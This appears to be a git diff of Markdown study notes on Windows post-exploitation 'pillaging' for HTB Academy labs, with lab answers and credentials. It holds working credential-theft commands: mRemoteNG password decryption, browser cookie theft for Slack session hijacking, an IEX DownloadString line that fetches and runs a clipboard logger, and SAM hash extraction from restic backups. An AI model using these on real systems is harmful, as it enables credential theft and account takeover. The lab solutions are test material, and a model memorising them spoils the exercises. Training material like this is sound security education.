@@ -1,4 +1,4 @@
-# Pillaging
+# 🎯 Pillaging
 
 ## 🎯 Overview
 
@@ -7,6 +7,7 @@
 ## 📊 Data Sources for Pillaging
 
 ### Primary Targets
+
 ```cmd
 # High-value data sources:
 - Installed applications & services
@@ -21,6 +22,7 @@
 ```
 
 ### Information Categories
+
 ```cmd
 # Types of valuable data:
 - Personal information (PII)
@@ -36,6 +38,7 @@
 ## 💻 Installed Application Enumeration
 
 ### Directory-Based Discovery
+
 ```cmd
 # Quick application enumeration:
 dir "C:\Program Files"
@@ -50,6 +53,7 @@ dir "C:\Program Files (x86)"
 ```
 
 ### Registry-Based Enumeration
+
 ```powershell
 # Comprehensive installed programs list:
 $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
@@ -60,6 +64,7 @@ $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -
 ## 🔧 mRemoteNG Exploitation
 
 ### Configuration File Location
+
 ```cmd
 # Default mRemoteNG config location:
 %USERPROFILE%\APPDATA\Roaming\mRemoteNG\confCons.xml
@@ -70,6 +75,7 @@ ls C:\Users\*\AppData\Roaming\mRemoteNG
 ```
 
 ### Configuration File Structure
+
 ```xml
 <!-- Example confCons.xml with default master password -->
 <?XML version="1.0" encoding="utf-8"?>
@@ -79,6 +85,7 @@ ls C:\Users\*\AppData\Roaming\mRemoteNG
 ```
 
 ### Password Decryption
+
 ```bash
 # Default master password decryption (hardcoded: "mR3m"):
 python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig=="
@@ -98,6 +105,7 @@ done
 ## 🍪 Browser Cookie Extraction
 
 ### Firefox Cookie Extraction
+
 ```powershell
 # Copy Firefox cookies database:
 copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
@@ -110,6 +118,7 @@ d=xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSC...
 ```
 
 ### Chrome Cookie Extraction
+
 ```powershell
 # Chrome cookies are DPAPI encrypted
 # Copy cookies to expected SharpChromium location:
@@ -123,6 +132,7 @@ Invoke-SharpChromium -Command "cookies slack.com"
 ```
 
 ### Cookie Abuse for IM Access
+
 ```cmd
 # Using Cookie-Editor browser extension:
 1. Navigate to target website (slack.com)
@@ -141,6 +151,7 @@ Invoke-SharpChromium -Command "cookies slack.com"
 ## 📋 Clipboard Monitoring
 
 ### PowerShell Clipboard Logger
+
 ```powershell
 # Monitor clipboard for credentials:
 IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')
@@ -153,6 +164,7 @@ Sup9rC0mpl2xPa$$ws0921lk
 ```
 
 ### Clipboard Target Data
+
 ```cmd
 # Common clipboard contents:
 - Passwords from password managers
@@ -166,6 +178,7 @@ Sup9rC0mpl2xPa$$ws0921lk
 ## 💾 Backup System Exploitation
 
 ### Restic Backup System
+
 ```cmd
 # Restic backup locations:
 C:\Windows\System32\restic.exe    # Common installation
@@ -180,6 +193,7 @@ restic.exe -r E:\restic2 restore <ID> --target C:\Restore
 ```
 
 ### Backup Repository Enumeration
+
 ```powershell
 # Initialize repository access:
 $env:RESTIC_PASSWORD = 'Password'
@@ -193,6 +207,7 @@ restic.exe -r E:\restic2 restore 9971e881 --target C:\Restore
 ```
 
 ### Backup Target Analysis
+
 ```cmd
 # Windows backup targets:
 C:\Windows\System32\config\SAM     # Local account hashes
@@ -213,6 +228,7 @@ C:\Users\*\Documents\              # User documents
 ## 🎯 HTB Academy Lab Solutions
 
 ### Lab Environment Access
+
 ```cmd
 # Various user credentials:
 Peter:Bambi123           # Lab 1-2
@@ -221,6 +237,7 @@ Jeff:<to_be_found>       # Lab 4-5
 ```
 
 ### Lab 1: Application Identification
+
 ```cmd
 # Objective: Identify remote management application
 # Method: Application enumeration
@@ -234,6 +251,7 @@ dir "C:\Program Files (x86)"
 ```
 
 ### Lab 2: mRemoteNG Password Extraction
+
 ```cmd
 # Objective: Extract Grace's password from mRemoteNG
 # Method: confCons.xml decryption
@@ -249,6 +267,7 @@ python3 mremoteng_decrypt.py -s "<Grace_password_hash>"
 ```
 
 ### Lab 3: Slack Cookie Extraction
+
 ```cmd
 # Objective: Extract Slack cookie for slacktestapp.com
 # Method: Browser cookie extraction as Grace
@@ -264,6 +283,7 @@ Invoke-SharpChromium -Command "cookies slacktestapp.com"
 ```
 
 ### Lab 4: Restic Password Discovery
+
 ```cmd
 # Objective: Find restic backup password as Jeff
 # Method: Environment variables, config files, credential hunting
@@ -279,6 +299,7 @@ findstr /SIM /C:"password" *.txt *.ini *.cfg *.config
 ```
 
 ### Lab 5: Administrator Hash Extraction
+
 ```cmd
 # Objective: Extract Administrator hash from backup
 # Method: Restic restore + SAM/SYSTEM extraction
@@ -299,6 +320,7 @@ cd C:\Restore\C\Windows\System32\config
 ## 🔄 Comprehensive Pillaging Strategy
 
 ### Systematic Approach
+
 ```cmd
 # 1. Application enumeration
 dir "C:\Program Files*"
@@ -322,6 +344,7 @@ Invoke-ClipboardLogger
 ```
 
 ### Automation Tools
+
 ```cmd
 # Comprehensive extraction tools:
 .\LaZagne.exe all              # Multi-application credential extraction
@@ -333,6 +356,7 @@ Invoke-ClipboardLogger         # Real-time clipboard monitoring
 ## ⚠️ Detection & Defense
 
 ### Detection Indicators
+
 ```cmd
 # Monitor for:
 - Browser database file access
@@ -345,6 +369,7 @@ Invoke-ClipboardLogger         # Real-time clipboard monitoring
 ```
 
 ### Defensive Measures
+
 ```cmd
 # Security recommendations:
 - Encrypt mRemoteNG configurations with strong passwords
@@ -366,6 +391,6 @@ Invoke-ClipboardLogger         # Real-time clipboard monitoring
 6. **Multiple data sources** require comprehensive extraction strategy
 7. **Automation tools** essential for efficient pillaging operations
 
----
+***
 
-*Pillaging transforms initial system access into comprehensive intelligence gathering for network expansion and objective completion.* 
+_Pillaging transforms initial system access into comprehensive intelligence gathering for network expansion and objective completion._
